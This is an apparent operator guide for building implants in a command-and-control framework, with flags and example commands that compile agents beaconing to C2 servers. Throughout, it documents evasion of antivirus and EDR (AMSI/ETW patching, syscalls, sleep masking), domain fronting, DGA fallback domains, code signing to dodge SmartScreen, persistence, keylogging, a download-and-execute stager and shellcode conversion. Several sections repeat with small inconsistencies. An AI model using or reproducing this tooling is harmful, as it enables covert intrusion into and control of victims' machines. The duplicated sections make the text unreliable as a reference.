# Builder Guide

The builder compiles agent binaries with embedded configuration, crypto keys, and malleable profiles.

## Basic Usage

```bash
cargo run --bin builder -- \
  --host 10.0.0.1 \
  --port 4443 \
  --platform linux \
  --transport tls \
  --sleep 30 \
  --jitter-min 100 \
  --jitter-max 500
```

The builder requires the pinned nightly toolchain (`rust-toolchain.toml`,
currently `nightly-2026-08-22` with the `rust-src` component). It refuses to
produce agents on stable Rust, because only nightly can strip panic file/line
metadata (`-Zlocation-detail=none`, `-Ztrim-paths`, `-Zbuild-std` with
immediate-abort panics); without them the binary leaks the source tree layout.
`--allow-stable-leak` overrides the refusal for throwaway dev builds - never
ship the result.

## Flags

### Core

| Flag | Default | Description |
|------|---------|-------------|
| `--host` | `127.0.0.1` | C2 server address |
| `--port` | `4443` | C2 server port (or pipe name for named-pipe) |
| `--platform` | `linux` | Target: `linux`, `linux-musl` (static), `windows`, `macos` |
| `--transport` | `tls` | Transport: `tls`, `tcp-plain`, `named-pipe`, `http`, `https` (kebab-case, as clap accepts them) |
| `--format` | `exe` | Output: `exe`, `dll`, `service`, `stager`, `shellcode`, `donut`, `pe_to_shellcode`, `pic_c`, `bin` (see Output Formats) |
| `--profile` | `default` | Built-in profile: `default`, `http-post`, `http-image` |
| `--profile-file` | - | Path to custom malleable profile JSON (**positional array format** - see below) |
| `--fallback-file` | - | Path to fallback endpoints JSON (**positional array format** - see below) |
| `--sleep` | `40` | Beacon interval in seconds |
| `--jitter-min` | `0` | Minimum extra random sleep, in milliseconds (0 disables jitter) |
| `--jitter-max` | `100` | Maximum extra random sleep, in milliseconds; the agent picks `jitter_min..=jitter_max` each cycle |
| `--bloat` | `0` | Add N megabytes of padding to increase binary size |
| `--debug` | `false` | Enable debug output on the agent |
| `--days` | `0` | Kill date: agent self-destructs after N days (0 = never) |
| `--name` | - | Artifact filename base override (sanitized to `[A-Za-z0-9._-]`); replaces `<format>_<platform>_<id>` in `dist/` |
| `--certs-dir` | `certs/` | Directory with `ca.crt`, `client.crt`, `client.key.der` to embed instead of the stock certs (restored after the build) |

There is no DNS transport. The supported wire protocols are TLS, raw TCP,
named pipes, and HTTP(S); if you need DNS-shaped traffic, the closest option
is `https` with the `cloudflare_dns.json` traffic profile, which is a
DoH-shaped HTTP profile, not a real DNS channel.

### Platform support at a glance

The full command surface is Windows-first. Concretely:

- **Windows**: everything - evasion (AMSI/ETW/unhook/syscalls/heap AES),
  in-memory PE/BOF/.NET, process migration, keylogger, named-pipe pivots,
  registry/service persistence.
- **Linux** (glibc and static `linux-musl`): full C2 protocol, file/artifact
  commands, jobs, TCP pivots, SOCKS, rportfwd, extensions, systemd/profile/
  cron persistence. No evasion commands, inmem, migrate, or keylogger (all
  return loud errors). On musl builds, screenshot and clipboard scripting
  functions are stubbed (no X11 in a fully-static binary).
- **macOS**: same baseline as Linux, with persistence via LaunchAgents and
  cron (`persist:launchagent`, `persist:cron`). No evasion, inmem, migrate,
  keylogger, or named-pipe pivots.

### TLS Traffic Shaping

| Flag | Default | Description |
|------|---------|-------------|
| `--sni-override <hostname>` (alias `--sni`) | *(c2 host)* | SNI hostname advertised in TLS ClientHello. The TCP connection still goes to `--host`; set this to a CDN or cloud hostname to blend with legitimate TLS traffic. |
| `--alpn-protocols <protos>` (alias `--alpn`) | *(none)* | Comma-separated ALPN protocol list, e.g. `h2,http/1.1`. Advertised in TLS ClientHello. Must match what the listener actually speaks - do not advertise `h2` unless the server supports HTTP/2. |

These flags control the TLS ClientHello independently of the actual connection endpoint, enabling domain-fronting-style deployments where the SNI points to a CDN while traffic routes through the same infrastructure.

### Evasion

| Flag | Default | Description |
|------|---------|-------------|
| `--sleep-mask` | `ekko` | Sleep masking: `none` (plain sleep), `ekko` (config AES + PE header erasure + timer-queue wake + fiber stack spoof), `spoofed-stack` (config AES + fiber stack spoof only). Unknown values are rejected by the builder. See [Evasion](evasion.md). |
| `--indirect-syscalls` | `true` | Use indirect syscall stubs instead of direct ntdll calls |
| `--stack-spoof` | `true` | Fiber-based call-stack spoofing before every sleep |
| `--patch-amsi-etw` | `true` | Patch AMSI and ETW on agent startup |
| `--heap-encrypt` | `true` | AES-256-GCM encrypt the process heap during sleep windows (Windows only) |

### Execution Guardrails

| Flag | Default | Description |
|------|---------|-------------|
| `--guard-domain <glob>` | *(disabled)* | AD domain must match the glob (e.g. `CORP*`) or the agent exits at startup |
| `--guard-hostname <glob>` | *(disabled)* | Hostname must match the glob (e.g. `DESKTOP-*`) |
| `--guard-hours <HH-HH>` | *(disabled)* | Active-hours window, e.g. `8-18` |
| `--guard-no-system` | `false` | Exit if running as SYSTEM / root |
| `--valid-parents <list>` | *(disabled)* | Comma-separated exe basenames the parent process must match (e.g. `explorer.exe,svchost.exe`); bare names only, no paths |
| `--allow-vm` | `false` | Skip the built-in VM/sandbox artifact check. Use for known KVM/qemu cloud VPS targets; the check false-positives there |

### Egress Proxy

| Flag | Default | Description |
|------|---------|-------------|
| `--proxy-url <url>` | *(system)* | Explicit egress proxy for the agent, e.g. `http://proxy.corp.com:8080`. When set, the agent uses it instead of the host's system proxy settings |
| `--proxy-user` | - | Proxy username (requires `--proxy-url`) |
| `--proxy-pass` | - | Proxy password (requires `--proxy-url`) |

Per-endpoint proxy overrides are also available in fallback files (`[use_system, url, username, password]` per endpoint - see below).

### Hibernation / Dweller Mode

| Flag | Default | Description |
|------|---------|-------------|
| `--hibernation` | `false` | Enable hibernation mode. The agent connects, claims a batch of queued tasks, executes them, returns results on the same connection, then disconnects and sleeps. No persistent socket is held. |
| `--batch-size <n>` | `1` | Number of tasks to claim per check-in when in hibernation mode. |

Hibernation agents do not maintain a long-lived connection, which avoids long-connection detection signatures. Commands must be pre-queued via `POST /api/hosts/:id/queue` before the agent checks in. See [API Reference](api.md) for the task queue endpoints.

### Pivot Auto-Cascade

| Flag | Default | Description |
|------|---------|-------------|
| `--auto-pivot-port <port>` | *(disabled)* | TCP pivot listener the agent starts automatically right after its session handshake. Pre-wires multi-hop chains at build time: build hop 2 with `--auto-pivot-port 5002`, hop 3 with `5003`, and leave leaf nodes without it. |

### Domain Generation Algorithm (DGA)

| Flag | Default | Description |
|------|---------|-------------|
| `--dga-seed <u64>` | *(disabled)* | Enable DGA with this seed. When set, the agent generates additional C2 hostnames each time window and appends them as low-priority fallback endpoints. The operator must register the matching domains - computable from the same seed and window. |
| `--dga-window <secs>` | `86400` | Time window length in seconds. The domain set rotates every window. Default is daily. |
| `--dga-count <n>` | `16` | Number of domains to generate per window. |
| `--dga-tlds <list>` | `com,net,org` | Comma-separated TLD list to sample from, e.g. `com,net,io`. |

DGA domains are appended after any statically-configured fallback endpoints (priority >= 100) so they only activate when all explicit endpoints are unreachable. The algorithm is deterministic: given the same seed and window index, both the agent and operator compute identical domain lists. The agent re-checks the window at runtime and swaps the domain set when it rolls over. See [Fallback & DGA](fallback.md) for full details.

### Authenticode Signing (Windows PE)

Signing is ON by default whenever a signing cert is configured (`--sign-cert`,
or the signing settings in the panel/API). Opt out explicitly with
`--no-sign` (API: `"sign": false`). `--sign` without a cert keeps the legacy
behavior: a throwaway self-signed cert is generated for the build.

| Flag | Default | Description |
|------|---------|-------------|
| `--no-sign` | `false` | Opt out of Authenticode signing when a cert is configured. Unsigned agents trigger SmartScreen/Defender cloud prompts on every launch, including every boot once persistence is installed |
| `--sign` | *(auto)* | Sign explicitly without a configured cert: a throwaway self-signed cert is generated - lab use only (import it into the test machine's Trusted Root store) |
| `--sign-cert <file.pfx>` | - | PKCS#12 bundle (cert + key). Configuring a cert turns signing on by default |
| `--sign-pass` | *(empty)* | Password for the PKCS#12 bundle |
| `--sign-ts <url>` | *(none)* | RFC3161 timestamp server; a timestamped signature outlives the cert's expiry |
| `--sign-name` / `--sign-url` / `--sign-cn` | *(randomized)* | Authenticode program name, info URL, and self-signed subject CN. Randomized per build by default so the signature is not a static IOC |

### Artifact Customization

| Flag | Default | Description |
|------|---------|-------------|
| `--icon <file.ico>` | - | Embed a .ico as the PE icon (exe/service; requires `x86_64-w64-mingw32-windres`). Wins over `--icon-preset` |
| `--icon-preset <name>` | - | Resolve `assets/icons/<name>.ico` from the repo |
| `--pe-company` / `--pe-product` / `--pe-description` | - | VERSIONINFO strings (Windows exe/service) |
| `--pe-file-version` / `--pe-product-version` | - | VERSIONINFO `a.b.c.d` version fields (sets both the fixed numeric field and the string) |
| `--elf-comment <text>` | - | Embed a string into a `.comment` ELF section on Linux targets (post-link objcopy) |

> **Config carrier:** the embedded C2 config ships as a text carrier
> (chunked base64 string literals) rather than a raw high-entropy byte blob,
> so static entropy analysis does not read the artifact as packed. Decoding
> and decryption happen once at agent startup; the crypto is unchanged. See
> [evasion.md](evasion.md#static-surface-reduction).

### TLS Traffic Shaping

| Flag | Default | Description |
|------|---------|-------------|
| `--sni <hostname>` | *(c2 host)* | SNI hostname advertised in TLS ClientHello. The TCP connection still goes to `--host`; set this to a CDN or cloud hostname to blend with legitimate TLS traffic. |
| `--alpn <protos>` | `http/1.1` | Comma-separated ALPN protocol list, e.g. `h2,http/1.1`. Advertised in TLS ClientHello. Must match what the listener actually speaks - do not advertise `h2` unless the server supports HTTP/2. |

These flags control the TLS ClientHello independently of the actual connection endpoint, enabling domain-fronting-style deployments where the SNI points to a CDN while traffic routes through the same infrastructure.

### Hibernation / Dweller Mode

| Flag | Default | Description |
|------|---------|-------------|
| `--hibernation` | `false` | Enable hibernation mode. The agent connects, claims a batch of queued tasks, executes them, then disconnects and sleeps. No persistent socket is held. |
| `--batch-size <n>` | `1` | Number of tasks to claim per check-in when in hibernation mode. |

Hibernation agents do not maintain a long-lived connection, which avoids long-connection detection signatures. Commands must be pre-queued via `POST /api/hosts/:id/queue` before the agent checks in. See [API Reference](api.md) for the task queue endpoints.

### Domain Generation Algorithm (DGA)

| Flag | Default | Description |
|------|---------|-------------|
| `--dga-seed <u64>` | *(disabled)* | Enable DGA with this seed. When set, the agent generates additional C2 hostnames each time window and appends them as low-priority fallback endpoints. The operator must register the matching domains - computable from the same seed and window. |
| `--dga-window <secs>` | `86400` | Time window length in seconds. The domain set rotates every window. Default is daily. |
| `--dga-count <n>` | `16` | Number of domains to generate per window. |
| `--dga-tlds <list>` | `com,net,org` | Comma-separated TLD list to sample from, e.g. `com,net,io`. |

DGA domains are appended after any statically-configured fallback endpoints (priority ≥ 100) so they only activate when all explicit endpoints are unreachable. The algorithm is deterministic: given the same seed and window index, both the agent and operator compute identical domain lists. See [Fallback & DGA](fallback.md) for full details.

## Profile & Fallback File Formats (positional JSON)

> **Breaking change:** `--profile-file` and `--fallback-file` now take **positional
> JSON arrays** with no field names (this keeps field-name strings out of the agent
> binary). Old object-format files **no longer parse** - the builder rejects them
> with `Invalid Profile JSON format` / `Invalid fallback JSON (expected positional
> array format)`. Convert your files before building. Truncated positional arrays
> are tolerated: missing trailing elements fall back to the per-field defaults
> shown below. All templates in `fallback_profiles/` and `traffic_profiles/` are
> converted to the new format.

### Malleable profile (`--profile-file`)

`MalleableProfile` - a 5-element array:

| Index | Field | Type | Description |
|-------|-------|------|-------------|
| 0 | `name` | string | Profile name |
| 1 | `user_agent` | string | User-Agent header sent by the agent |
| 2 | `http_get` | HttpBlock array | GET request shaping |
| 3 | `http_post` | HttpBlock array | POST request shaping |
| 4 | `format_http` | bool | Strictly enforce HTTP/1.1 formatting over the raw stream |

`HttpBlock` - a 3-element array (`headers` stays a JSON object; everything else is positional):

| Index | Field | Type | Description |
|-------|-------|------|-------------|
| 0 | `uris` | array of strings | URIs to rotate through |
| 1 | `headers` | object | Header name → value map |
| 2 | `data_transform` | array of TransformStep arrays | Transforms applied to C2 data before sending |

`TransformStep` - a 1- or 2-element array, first element is the u8 tag:

| Tag | Transform | Payload | Example |
|-----|-----------|---------|---------|
| `0` | base64 | none | `[0]` |
| `1` | hex | none | `[1]` |
| `2` | mask (XOR) | array of bytes (multi-byte key) | `[2, [170, 187]]` |
| `3` | prepend | string | `[3, "var _0x5a1b = \""]` |
| `4` | append | string | `[4, "\";"]` |

`ProxyConfig` (per-endpoint proxy override) - a 4-element array:
`[use_system, url, username, password]`, e.g. `[true, "", "", ""]` (use system
proxy settings) or `[false, "http://proxy.corp.com:8080", "user", "pass"]`.

Example (converted `traffic_profiles/jquery_cdn.json`):

```json
[
  "jquery_cdn",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
  [
    ["/jquery-3.6.0.min.js", "/jquery-ui.min.js", "/jquery-migrate.js"],
    {"Host": "code.jquery.com", "Referer": "http://code.jquery.com/", "Accept": "application/javascript"},
    []
  ],
  [
    ["/beacon/telemetry.js"],
    {"Host": "code.jquery.com", "Content-Type": "application/javascript"},
    [
      [3, "/* jQuery v3.6.0 | (c) OpenJS Foundation and other contributors | jquery.org/license */\nvar _0x5a1b = \""],
      [1],
      [4, "\";"]
    ]
  ],
  true
]
```

### Fallback endpoints (`--fallback-file`)

`FallbackConfig` - `[endpoints, strategy, dead_time_secs]`; each endpoint is
`[host, port, transport, profile, proxy, priority, weight, max_failures]` with
u8 tags for `transport` (`0`=tls, `1`=tcp_plain, `2`=named_pipe, `3`=http,
`4`=https) and `strategy` (`0`=round_robin, `1`=random, `2`=priority,
`3`=failover). Full field tables and a complete example:
[Fallback & DGA - Fallback File Format](fallback.md#fallback-file-format-positional-json).

## Output Formats

### EXE (default)
Standard executable. Run directly or via any execution method.

### DLL
A real PE DLL (cdylib): the export table carries `DllMain`, and on
`DLL_PROCESS_ATTACH` the agent spawns on a new thread and returns TRUE
immediately so the host's loader lock is never held. Both load paths work:
- `rundll32.exe agent.dll,DllMain` (calls the export by name)
- sRDI / donut / LoadLibrary (reach `DllMain` via the PE entry point)
- DLL sideloading

### Service
Windows service binary. Register with:
```
sc create RCMAgent binPath= "C:\path\to\service.exe"
sc start RCMAgent
```

### Stager
Minimal downloader (~50KB). Requires `--transport http` or `https` - the
builder rejects any other transport, because the stager speaks HTTPS (with
raw-HTTP fallback) to the staging endpoint.

Flow:
1. A stager build also compiles the full agent with the same embedded config and places it where the HTTP listener can serve it.
2. The stager fetches `GET /stage/<build_id>` from the C2 server. The request carries `X-Stage-Timestamp` and `X-Stage-HMAC` headers computed from a per-build challenge key; the listener rate-limits by source IP and returns 404 for anything unauthenticated, so the endpoint is invisible to scanners.
3. The stager writes the payload to temp, executes it, and cleans up.

Good for initial access where payload size matters.

### Donut (`--format donut`)
Builds the agent DLL, then converts it with a vendored, commit-pinned build
of [donut](https://github.com/TheWover/donut) into position-independent
shellcode. Windows targets.

### OEP sRDI (`--format pe_to_shellcode`)
Builds the agent EXE, then converts it with the OEP sRDI stub: maps the PE in
memory and calls the original entry point (as opposed to the DLL-flavored
`--format shellcode`, which calls `DllMain`).

### PIC from C (`--format pic_c`)
Compiles operator-supplied C (`--pic-src`, default `templates/pic_template.c`)
into position-independent x86_64 shellcode. No Rust agent is built; use this
for custom lightweight payloads.

### Pipeline selector (`--format bin`)
Generic `.bin` pipeline driven by `--pipeline stage1,stage2,...`:

- **Source stage (first, required):** `pe`/`exe` (build the agent EXE), `dll` (build the agent DLL), `pic` (compile PIC C source; no Rust build)
- **Transform stages (in order):** `donut`, `srdi`, `pe_to_shellcode`, `sign`, `b64`

Default when `--pipeline` is omitted: `pe,donut`. Windows-only in this
version; the builder rejects other platforms with a clear error.

```bash
cargo run --bin builder -- \
  --host 10.0.0.1 --port 443 --transport https --platform windows \
  --format bin --pipeline dll,srdi,b64
```

### Shellcode (.bin)
Windows x64 only. Builds the agent DLL, then converts it into position-independent
shellcode using sRDI-style reflective loading:

```
┌─────────────────────┬──────────────────┬─────────────┬───────────┐
│ bootstrap (69 bytes)│ RDI loader stub │ raw DLL │ user data │
└─────────────────────┴──────────────────┴─────────────┴───────────┘
```

At runtime the bootstrap captures RIP, passes the DLL pointer / export hash /
user-data pointer / flags to the embedded loader stub, which maps the DLL in
memory (section copy, base relocations, import resolution via PEB walk + ROR13
hashing) and calls `DllMain(DLL_PROCESS_ATTACH)` - where the RCM agent spawns
its thread. No export call is needed for RCM agents, hence the default hash
`0x10` ("none").

The conversion is byte-for-byte compatible with [sRDI](https://github.com/monoxgas/sRDI)
(BSD 3-Clause, Copyright (c) 2013 Matthew Graeber); the embedded 64-bit loader
stub is sRDI's precompiled `ShellcodeRDI` output. Execute the `.bin` with any
shellcode loader (`VirtualAlloc` + `memcpy` + `CreateThread`, or your injector
of choice - see `extensions/inject_*.rhai`).

Shellcode-specific flags:

| Flag | Default | Description |
|------|---------|-------------|
| `--sc-hash` | `0x10` | ROR13 hash of a DLL export to call after load (hex or decimal). `0x10` = none |
| `--sc-userdata` | `None` | Opaque blob appended after the DLL; pointer+length handed to the loader |
| `--sc-flags` | `0` | Loader flags (bit0: erase PE headers after load, bit1: obfuscate imports) |
| `--sc-output` | `bin` | File encoding: `bin` (raw), `b64`, `c` (C array), `hex` |

```bash
cargo run --bin builder -- \
  --host 10.0.0.1 --port 4443 \
  --platform windows --transport tls \
  --format shellcode --sc-output bin
# -> dist/shellcode_windows_<id>.bin
```

## Examples

HTTPS agent through corporate proxy with CDN fronting:
```bash
cargo run --bin builder -- \
  --host 203.0.113.5 --port 443 \
  --transport https --platform windows \
  --sni legitimate-cdn.example.com \
  --alpn h2,http/1.1 \
  --profile-file traffic_profiles/slack_api.json \
  --fallback-file fallback_profiles/corporate_proxy.json \
  --sleep 60 --days 30
```

Hibernation agent with task queue:
```bash
cargo run --bin builder -- \
  --host 10.0.0.1 --port 4443 \
  --transport tls --platform linux \
  --hibernation --batch-size 5 \
  --sleep 120
# Pre-queue commands via API before the agent checks in:
# POST /api/hosts/:id/queue {"command": "whoami"}
```

Agent with DGA fallback (daily rotation, 32 domains/day):
```bash
cargo run --bin builder -- \
  --host primary.example.com --port 4443 \
  --transport tls --platform linux \
  --dga-seed 14831264957 \
  --dga-count 32 \
  --dga-tlds com,net,io \
  --sleep 30
```

Linux EXE with short beacon interval:
```bash
cargo run --bin builder -- \
  --host 10.0.0.1 --port 4443 \
  --transport tls --platform linux \
  --format exe --sleep 5
```